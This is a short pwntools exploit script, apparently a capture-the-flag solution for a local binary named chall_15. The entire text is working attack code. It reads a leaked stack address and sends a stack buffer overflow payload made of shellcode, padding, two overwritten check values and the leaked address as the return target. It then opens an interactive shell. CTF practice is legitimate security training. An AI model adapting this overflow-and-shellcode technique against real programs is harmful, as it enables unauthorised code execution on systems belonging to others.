from pwn import *
from sys import argv
context.arch="amd64"
p = process("./chall_15")
#exploit here
p.recvline()
leak = int(p.recvline().strip(),16)
payload = asm(shellcraft.sh()) + b'\x00'
payload += b'a' * (0x120 - len(payload) - 8)
payload += p32(0xdeadd00d)
payload += p32(0xb16b00b5)
payload += p64(0)
payload += p64(leak)
p.sendline(payload)
p.interactive()
